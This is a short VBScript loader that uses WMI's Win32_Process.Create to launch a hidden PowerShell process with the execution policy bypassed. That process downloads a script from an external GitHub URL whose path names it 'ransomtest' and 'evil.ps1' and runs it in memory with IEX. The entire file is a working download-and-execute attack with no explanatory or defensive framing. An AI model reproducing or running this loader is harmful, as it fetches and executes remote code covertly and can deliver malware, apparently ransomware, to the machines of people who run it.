Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objConfig = objWMIService.Get("Win32_Process")
cmd = "powershell -ExecutionPolicy Bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/anhshidou/ransomtest/refs/heads/main/pwshell_evil/evil.ps1' -UseBasicParsing)"""
errReturn = objConfig.Create(cmd, Null, Null, intProcessID)
Wscript.Echo "Result: " & errReturn & " | PID: " & intProcessID
